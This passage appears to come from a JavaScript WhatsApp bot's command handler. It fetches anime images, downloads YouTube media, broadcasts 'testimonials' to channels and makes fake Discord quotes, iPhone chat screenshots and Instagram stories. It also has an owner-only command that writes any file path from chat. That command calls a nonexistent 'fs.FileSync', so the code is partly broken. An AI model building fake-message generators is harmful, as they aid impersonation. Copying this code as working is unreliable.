┃  ❏ ${prefix}ᴢᴏᴅɪᴀᴋ
┃  ❏ ${prefix}ꜱʜɪᴏ
┗═━═━═━═━═━═━═━═`
        Putzz.sendMessage(m.chat, {
        text: primbon,
        contextInfo: {
            externalAdReply: {
                title: `Mikasa-MD Made With`,
                body: `Putzzslebew`,
                thumbnailUrl: ppmenu,
                sourceUrl: global.ceha,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: qtext })
};
break;

case 'random-anime': {
  await Putzz.sendMessage(m.chat, {
    image: { url: 'https://pic.re/image' }
  }, { quoted: m })
}
break;
case 'randomba': {
  try {
    // Menggunakan axios untuk mengambil gambar dari URL
//     = await import('axios')
    const { data } = await axios.default.get('https://flowfalcon.dpdns.org/random/ba', { responseType: 'arraybuffer' })

    // Mengonversi gambar menjadi buffer dan mengirimnya sebagai image
    const buffer = Buffer.from(data)
    await Putzz.sendMessage(m.chat, {
      image: buffer,
      caption: 'Ini gambar acak untukmu! 🎉'  // Caption bisa kamu sesuaikan
    }, { quoted: m })

  } catch (e) {
    console.error(e)
    ReplyLanz('Gagal mengambil gambar, coba lagi nanti.')
  }
}
break
            case 'animeawoo':{
            
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animemegumin':{

ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeshinobu':{

ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehandhold':{

ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehighfive':{

ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecringe':{

ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animedance':{

ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehappy':{

ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeglomp':{

ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animesmug':{

ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeblush':{

ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewave':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animesmile':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepoke':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewink':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebonk':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebully':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeyeet':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebite':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animelick':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animekill':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecry':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewlp':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animekiss':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehug':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'couplepp': case 'ppcouple': {
ReplyLanz(mess.wait)
let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json')
let random = anucpp[Math.floor(Math.random() * anucpp.length)]
Putzz.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
Putzz.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break

case 'animeneko':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepat':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeslap':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecuddle':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewaifu':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animenom':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animefoxgirl':{
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await Putzz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animetickle': {
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await Putzz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animegecg': {
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await Putzz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'dogwoof': {
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await Putzz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case '8ballpool': {
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await Putzz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'goosebird': {
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await Putzz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animefeed': {
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await Putzz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeavatar': {
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await Putzz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'lizardpic': {
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await Putzz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'catmeow': {
ReplyLanz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await Putzz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break


            
            case 'setfile': case 'setjs': {
    if (!isCreator) return ReplyLanz(mess.owner)
 let filePath, newContent;
 if (text.includes('|')) {
 const splitText = text.split('|');
 filePath = splitText[0].trim();
 newContent = splitText.slice(1).join('|'); 
 } else if (text && m.quoted) {
 filePath = text.trim();
 newContent = m.quoted.text || m.quoted.content || m.quoted.message?.text || m.quoted.message?.conversation || '';
 } else {
 return ReplyLanz(`*Format Salah!*\nContoh:\n${prefix + command} settings.js|kode`);
 }
 if (!filePath) {
 return ReplyLanz(`*Format Salah!*\nLokasi file tidak boleh kosong`);
 }
 try {
// const equire('fs');
// const equire('path');
 const absolutePath = path.isAbsolute(filePath) ? filePath : path.resolve(filePath); 
 if (!fs.existsSync(absolutePath)) {
 try {
 const dir = path.dirname(absolutePath);
 if (!fs.existsSync(dir)) {
 fs.mkdirSync(dir, { recursive: true });
 }
 fs.writeFileSync(absolutePath, '');
 ReplyLanz(`File '${filePath}' tidak ditemukan. File baru telah dibuat.`);
 } catch (err) {
 return ReplyLanz(`*Gagal Membuat File!*\nFile '${filePath}' tidak dapat dibuat: ${err.message}`);
 }
 }
 if (!newContent) {
 return ReplyLanz(`*Gagal Mengubah File!*\nKonten tidak boleh kosong.`);
 }
 fs.FileSync(absolutePath, newContent);
 await Putzz.sendMessage(m.chat, { text: `_Berhasil Mengubah Isi File ${filePath} ✅_` }, { quoted: m });
 const settingsPath = path.resolve('settings.js');
 const modifiedPath = path.resolve(filePath);
 if (settingsPath === modifiedPath || filePath.includes('settings.js')) {
 ReplyLanz('_Perubahan pada settings.js terdeteksi. Bot akan restart..._');
 setTimeout(() => {
 process.exit(0);
 }, 2000);
 }
 } catch (error) {
 console.error(`Error updating ${filePath}:`, error);
 await Putzz.sendMessage(m.chat, { text: `_Gagal menyimpan perubahan ke file ${filePath}: ${error.message}_` }, { quoted: m });
 }
}
break
case 'botakan':
    case 'botakin': {
      let q = m.quoted ? m.quoted : m
      let mime = (q.msg || q).mimetype || ""
      let defaultPrompt = "Desain ulang karakter pada gambar tersebut dengan membuat rambut menjadi botak dan tidak memiliki rambut. Pastikan botak tersebut menghilangkan seluruh rambut karakter, sehingga tidak terlihat sama sekali. Botak harus dirancang dengan cara yang natural dan realistis, sehingga terlihat seperti botak yang dikenakan dalam kehidupan sehari-hari. Perhatikan detail dan tekstur botak agar terlihat autentik dan sesuai dengan karakter aslinya."

      if (!mime) {
        ReplyLanz("Tidak ada gambar yang direply, membuat gambar default...")
        mime = "image/png"
        q = {
          msg: {
            mimetype: mime
          },
          download: async () => fs.readFileSync("default_image.png")
        }
      }

      if (!/image\/(jpe?g|png)/.test(mime)) return ReplyLanz(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`)

      let promptText = text || defaultPrompt
      lyreact()

      try {
        let imgData = await q.download()
        let genAI = new GoogleGenerativeAI(geminiToken)
        const base64Image = imgData.toString("base64")

        const contents = [{
            text: promptText
          },
          {
            inlineData: {
              mimeType: mime,
              data: base64Image
            }
          }
        ]

        const model = genAI.getGenerativeModel({
          model: "gemini-2.0-flash-exp-image-generation",
          generationConfig: {
            responseModalities: ["Text", "Image"]
          },
        })

        const response = await model.generateContent(contents)
        let resultImage
        let resultText = ""

        for (const part of response.response.candidates[0].content.parts) {
          if (part.text) {
            resultText += part.text
          } else if (part.inlineData) {
            const imageData = part.inlineData.data
            resultImage = Buffer.from(imageData, "base64")
          }
        }

        if (resultImage) {
          const tmpDir = path.join(process.cwd(), "./library/database/sampah")
          if (!fs.existsSync(tmpDir)) {
            fs.mkdirSync(tmpDir, {
              recursive: true
            })
          }

          let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`)
          fs.writeFileSync(tempPath, resultImage)

          await Putzz.sendMessage(m.chat, {
            image: {
              url: tempPath
            },
            caption: wm
          }, {
            quoted: m
          })

          setTimeout(() => {
            try {
              fs.unlinkSync(tempPath)
            } catch (err) {
              throw Error('Error')
            }
          }, 30000)
        }
      } catch (err) {
        console.error(err.message)
        ReplyLanz('Gagal mendeteksi gambar')
      }
    }
    break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "unblok": {
if (!isCreator) return ReplyLanz(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return ReplyLanz(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await Putzz.updateBlockStatus(mem, "unblock");
if (m.isGroup) Putzz.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break


case 'makequote' : {
//const  require("axios")
const miq = {
 api: {
 base: "https://api.voids.top",
 endpoints: {
 fakequote: "/fakequote",
 fakequotebeta: "/fakequotebeta"
 },
 botghost: {
 base: "https://dashboard.botghost.com/api/public/tools/user_lookup"
 }
 },

 headers: {
 'content-type': 'application/json',
 'accept': 'application/json',
 'origin': 'https://botghost.com',
 'referer': 'https://botghost.com/',
 'user-agent': 'Postify/1.0.0'
 },

 wm: "MIQ#Daffa ~",

 getDiscordUser: async (userId) => {
 if (!userId || userId.trim() === '') {
 return {
 status: false,
 code: 400,
 message: 'ID User Discordnya mana bree? jangan kosong begitu inputnya lah 🗿'
 };
 }

 try {
 const response = await axios.get(`${miq.api.botghost.base}/${userId}`, {
 headers: miq.headers
 });

 const user = response.data;
 if (!user || Object.keys(user).length === 0) {
 return {
 status: false,
 code: 404,
 message: `User ID ${userId} kagak ada bree, ganti user id yang lain aja yak 😑`
 };
 }

 const ava = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : null;

 return {
 status: true,
 code: 200,
 result: {
 avatar: ava,
 username: user.username,
 displayName: user.global_name || user.username
 }
 };
 } catch (error) {
 if (error.response && error.response.status === 404) {
 return {
 status: false,
 code: 404,
 message: `User ID ${userId}nya kagak ada breee, coba ganti yang lain aja dahhh 🙃`
 };
 } else if (error.response) {
 return {
 status: false,
 code: error.response.status,
 message: `${error.response.data.message || error.message}`
 };
 } else {
 return {
 status: false,
 code: 500,
 message: `${error.message}`
 };
 }
 }
 },

 isDiscord: (id) => {
 return /^\d{17,19}$/.test(id);
 },

 generate: async (userId, text, color, watermark) => {
 if (!userId || !miq.isDiscord(userId)) {
 return {
 status: false,
 code: 400,
 message: 'User IDnya kagak valid bree 🗿 minimal user nya make discord 😂.'
 };
 }

 if (!text || typeof text !== 'string' || text.trim() === '') {
 return {
 status: false,
 code: 400,
 message: 'Teks Quotenya kagak boleh kosong bree 😂'
 };
 }

 if (typeof color !== 'boolean') {
 return {
 status: false,
 code: 400,
 message: 'Color harus boolean (true atau false) yak bree'
 };
 }

 watermark = watermark || miq.wm;

 try {
 const userInfo = await miq.getDiscordUser(userId);
 if (!userInfo.status) {
 return userInfo;
 }

 const payload = {
 text: text,
 avatar: userInfo.result.avatar,
 username: userInfo.result.username,
 display_name: userInfo.result.displayName,
 color: color,
 watermark: watermark
 };

 const response = await axios.post(`${miq.api.base}${miq.api.endpoints.fakequote}`, payload, {
 headers: miq.headers
 });

 return {
 status: true,
 code: 200,
 result: {
 image: response.data.url
 }
 };

 } catch (error) {
 if (error.response) {
 return {
 status: false,
 code: error.response.status,
 message: `${error.response.data.message || error.message}`
 };
 } else {
 return {
 status: false,
 code: 500,
 message: `${error.message}`
 };
 }
 }
 }
};
 if (!args[0]) return ReplyLanz(`Gini Cara Pakenya\n\n*Usage :* .miq ID Discord|Text Qoutes|true/false|watermark\n\n*Example :* .${command} 1336652791925706822|Kadang Hidup Itu Senang Kadang Susah|true|bella`);

 const [userId, quoteText, color, watermark] = text.split('|');
 
 if (!miq.isDiscord(userId)) return ReplyLanz('User ID Discord Nya Yang Valid Dong');
 if (!quoteText) return ReplyLanz('Qoute Jangan Kosong');
 
 const colorBool = color === 'true';
 
 try {
 const result = await miq.generate(userId, quoteText, colorBool, watermark);
 
 if (!result.status) return ReplyLanz(result.message);
 
 await Putzz.sendMessage(m.chat, {
 image: { url: result.result.image },
 }, { quoted: m });
 
 } catch (error) {
 ReplyLanz(`${error.message}`);
 }
};
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


case "sendtesti": 
case "testi": {
  if (!isCreator) return ReplyLanz(global.mess.owner)
  if (!text) return ReplyLanz(example("teks dengan mengirim foto"))
  if (!isImage) return ReplyLanz(example("teks dengan mengirim foto"))
  global.channels = loadChannels();
  if (global.channels.length === 0) return ReplyLanz("Tidak ada channel yang terdaftar");
  const rest = await Putzz.downloadAndSaveMediaMessage(qmsg)
  await ReplyLanz(`Memproses testimoni ke dalam channel`)
  for (let channel of global.channels) {
    await Putzz.sendMessage(channel, {
      image: await fs.readFileSync(rest),
      caption: text
    })
    await sleep(global.delayJpm); // delay sesuai dengan pengaturan
  }
  await fs.unlinkSync(rest)
  await Putzz.sendMessage(m.chat, {
    text: `Testimoni berhasil dikirim ke dalam channel`
  }, { quoted: m })
}
break;
case 'play-v3': case 'play3':
case 'ytmp3-v2': case 'ytmp32': 
case 'ytmp4-v3': case 'ytmp43': {
  if (!text) return ReplyLanz(`Contoh:\n.play3 someone like you\n.ytmp3-v2 <url>\n.ytmp4-v3 <url>`)
  await Putzz.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })

  async function searchYouTube(query) {
 //   const  require('axios')
    const res = await axios.get('https://www.youtube.com/results', {
      params: { search_query: query },
      headers: { 'User-Agent': 'Mozilla/5.0' }
    })
    const videoId = res.data.match(/"videoId":"(.*?)"/)?.[1]
    if (!videoId) throw 'Video tidak ditemukan'
    return `https://www.youtube.com/watch?v=${videoId}`
  }

  async function ssvidDownloader(url, forceType = null) {
 //   const  require('axios')
    const qs = require('qs')
    if (!/^https:\/\/(www\.)?(youtube\.com|youtu\.be)\//.test(url)) throw 'URL tidak valid'
    const res = await axios.post(
      'https://ssvid.net/api/ajax/search',
      qs.stringify({ query: url, vt: 'home' }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'X-Requested-With': 'XMLHttpRequest'
        }
      }
    )

    const data = res.data
    if (!data || data.status !== 'ok') throw 'Gagal mengambil data video'
    const { title, a: author, t: duration, vid } = data
    const thumbnail = `https://img.youtube.com/vi/${vid}/hqdefault.jpg`
    const formats = []
    for (const q in data.links?.mp4 || {}) {
      const v = data.links.mp4[q]
      formats.push({ quality: v.q_text, size: v.size, format: v.f, type: 'video', k: v.k })
    }
    for (const q in data.links?.mp3 || {}) {
      const a = data.links.mp3[q]
      formats.push({ quality: a.q_text, size: a.size, format: a.f, type: 'audio', k: a.k })
    }
    let selected = formats.find(f => f.quality.includes('360p')) || formats[0]
    if (forceType === 'audio') selected = formats.find(f => f.type === 'audio') || selected
    if (forceType === 'video') selected = formats.find(f => f.type === 'video') || selected
    if (!selected || !selected.k) throw 'Tidak ada format yang bisa dikonversi'
    const conv = await axios.post(
      'https://ssvid.net/api/ajax/convert',
      qs.stringify({ vid, k: selected.k }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'X-Requested-With': 'XMLHttpRequest',
          'Referer': 'https://ssvid.net/',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'
        }
      }
    )
    const converted = conv.data
    const downloadUrl = converted?.url || converted?.dlink
    if (!downloadUrl) throw 'Gagal mengonversi media'
    return {
      title,
      author,
      duration,
      thumbnail,
      download: {
        url: downloadUrl,
        format: selected.format,
        quality: selected.quality,
        size: selected.size,
        type: selected.type
      }
    }
  }

  let hasil
  if (command == 'play3') {
    const link = await searchYouTube(text)
    hasil = await ssvidDownloader(link, 'audio')
    const info = `YOUTUBE - PLAY\n\nJudul: ${hasil.title}\nAuthor: ${hasil.author}\nDurasi: ${hasil.duration}\nKualitas: ${hasil.download.quality}`
    await Putzz.sendMessage(m.chat, {
      text: info,
      contextInfo: {
        externalAdReply: {
          title: hasil.title,
          body: 'Play Music',
          thumbnailUrl: hasil.thumbnail,
          sourceUrl: link,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m })
    return Putzz.sendMessage(m.chat, {
      audio: { url: hasil.download.url },
      mimetype: 'audio/mp4',
      ptt: false
    }, { quoted: m })
  }

  if (command == 'ytmp3-v2') {
    if (!text.includes('youtu')) return ReplyLanz('Masukkan URL YouTube yang valid')
    hasil = await ssvidDownloader(text, 'audio')
    const info = `YOUTUBE - AUDIO\n\nJudul: ${hasil.title}\nAuthor: ${hasil.author}\nDurasi: ${hasil.duration}\nKualitas: ${hasil.download.quality}`
    await Putzz.sendMessage(m.chat, {
      text: info,
      contextInfo: {
        externalAdReply: {
          title: hasil.title,
          body: 'YouTube Audio',
          thumbnailUrl: hasil.thumbnail,
          sourceUrl: text,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m })
    return Putzz.sendMessage(m.chat, {
      audio: { url: hasil.download.url },
      mimetype: 'audio/mp4',
      ptt: false
    }, { quoted: m })
  }

  if (command == 'ytmp4-v3') {
    if (!text.includes('youtu')) return ReplyLanz('Masukkan URL YouTube yang valid')
    hasil = await ssvidDownloader(text, 'video')
    const info = `YOUTUBE - VIDEO\n\nJudul: ${hasil.title}\nAuthor: ${hasil.author}\nDurasi: ${hasil.duration}\nKualitas: ${hasil.download.quality}`
    return Putzz.sendMessage(m.chat, {
      video: { url: hasil.download.url },
      mimetype: 'video/mp4',
      caption: info
    }, { quoted: m })
  }
  await Putzz.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
}
break

/*
📌 Nama Fitur: Fake igstory
🏷️ Type : Case
🔗 Sumber : https://whatsapp.com/channel/0029VaxvdhJ6buMSjkRBNR2d
✍️ Convert By ZenzXD
*/
case "iqc": {
 try {
 if (!text) {
 return ReplyLanz('Format salah! Gunakan: .iqc jam|batre|pesan\nContoh: .iqc 18:00|40|hai hai');
 }

 const parts = text.split('|');
 if (parts.length < 3) {
 return ReplyLanz('Format salah! Gunakan:\n.iqc jam|batre|pesan\nContoh:\n.iqc 18:00|40|hai hai');
 }

 const [time, battery, ...messageParts] = parts;
 const message = messageParts.join('|').trim();

 if (!time || !battery || !message) {
 return ReplyLanz('Format tidak lengkap! Pastikan mengisi jam, batre, dan pesan');
 }

 await Putzz.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

 const encodedTime = encodeURIComponent(time);
 const encodedMessage = encodeURIComponent(message);
 const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodedTime}&batteryPercentage=${battery}&carrierName=INDOSAT&messageText=${encodedMessage}&emojiStyle=apple`;

 const axios = require('axios');
 const response = await axios.get(url, { responseType: 'arraybuffer' });

 if (!response.data) {
 throw new Error('Gagal mendapatkan gambar dari server');
 }

 await Putzz.sendMessage(m.chat, {
 image: Buffer.from(response.data),
 caption: '✅ Pesan iPhone quote berhasil dibuat.'
 }, { quoted: m });

 await Putzz.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

 } catch (error) {
 console.error('Error di iqc:', error);
 ReplyLanz(`❌ Error: ${error.message || 'Terjadi kesalahan saat memproses'}`);
 }
}
break
case "fakestoryapi": {
  if (!text) return ReplyLanz("contoh:\n.fakestory Ichika|hmm...");
  
  let [username, caption] = text.split("|");
  // Pastikan username dan caption tidak kosong setelah split
  if (!username || !caption) return ReplyLanz("Format salah!\nContoh: .fakestory Ichika|hmm...");

  try {
    await Putzz.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
    let ppUrl = await Putzz.profilePictureUrl(m.sender, 'image').catch(_ => '');
    
    let url = `https://lanzcihuyyy-apitermux.vercel.app/api/fakestory?username=${encodeURIComponent(username)}&caption=${encodeURIComponent(caption)}&pp=${encodeURIComponent(ppUrl || '')}`;
    
    // Tambahkan permintaan HTTP untuk mengambil SVG
    let res = await fetch(url);
    if (!res.ok) throw new Error(`Gagal mengambil data dari API: ${res.statusText}`);
    
    let svgBuffer = await res.buffer();
    let pngBuffer = await sharp(svgBuffer).png().toBuffer();
    
    await Putzz.sendMessage(m.chat, {
      image: { url: pngBuffer },
      caption: "Berhasil"
    }, { quoted: m });
  } catch (e) {
    ReplyLanz(`❌ Error\nLogs error : ${e.message}`);
  }
}
break;

case 'fakestory': {
 try {
 const { createCanvas, loadImage } = require('canvas')
 await Putzz.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
 let [username, caption] = text.split('|')
 if (!username || !caption) return ReplyLanz(`Kek gini:\n.${command} Ichika|hmm...`)
 const bgUrl = 'https://files.catbox.moe/3gwr1l.jpg'
 const bg = await loadImage(bgUrl)
 const userPP = await Putzz.profilePictureUrl(m.sender, 'image').catch(_ => 'https://img1.pixhost.to/images/5831/600387261_biyu-offc.jpg')
 const pp = await loadImage(userPP)
 const canvas = createCanvas(720, 1280)
 const ctx = canvas.getContext('2d')
 ctx.drawImage(bg, 0, 0, canvas.width, canvas.height)
 const ppX = 40
 const ppY = 250
 const ppSize = 70
 ctx.save()
 ctx.beginPath()
 ctx.arc(ppX + ppSize / 2, ppY + ppSize / 2, ppSize / 2, 0, Math.PI * 2)
 ctx.closePath()
 ctx.clip()
 ctx.drawImage(pp, ppX, ppY, ppSize, ppSize)
 ctx.restore()
 ctx.font = '28px Arial'
 ctx.fillStyle = '#FFFFFF'
 ctx.textAlign = 'left'
 ctx.textBaseline = 'middle'
 const usernameX = ppX + ppSize + 15
 const usernameY = ppY + ppSize / 2
 ctx.fillText(username, usernameX, usernameY)
 ctx.font = 'bold 30px Arial'
